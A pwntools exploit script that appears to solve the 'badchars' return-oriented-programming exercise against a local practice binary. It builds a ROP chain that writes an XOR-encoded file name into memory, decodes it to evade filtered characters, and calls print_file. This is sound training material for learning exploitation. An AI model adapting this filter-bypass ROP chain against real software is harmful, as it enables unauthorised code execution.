from pwn import *

io = process("./badchars")

io = gdb.debug("./badchars", 
'''
break *0x000000000040069c
continue
''')


mov_qword_r13_r12 = 0x0000000000400634
pop_rdi = 0x00000000004006a3
data = 0x0000000000601038                           #bss section cos data section wasnt big enough? ran into a different function in r15 in the second last character 
xor_r15_r14 = 0x0000000000400628
print_file = 0x0000000000400620
pop_r12_to_r15 = 0x000000000040069c
pop_r14_r15 = 0x00000000004006a0

payload = b"a"*40
payload += p64(pop_r12_to_r15)
payload += p64(0x6569653f76707d77)
payload += p64(data)
payload += p64(0xa)
payload += p64(0xa)
payload += p64(mov_qword_r13_r12)
for i in range(8):
    payload += p64(pop_r14_r15)
    payload += p64(0x1111111111111111)
    payload += p64(data + i)
    payload += p64(xor_r15_r14)
payload += p64(pop_rdi)
payload += p64(data)
payload += p64(print_file)

io.sendline(payload)
io.interactive()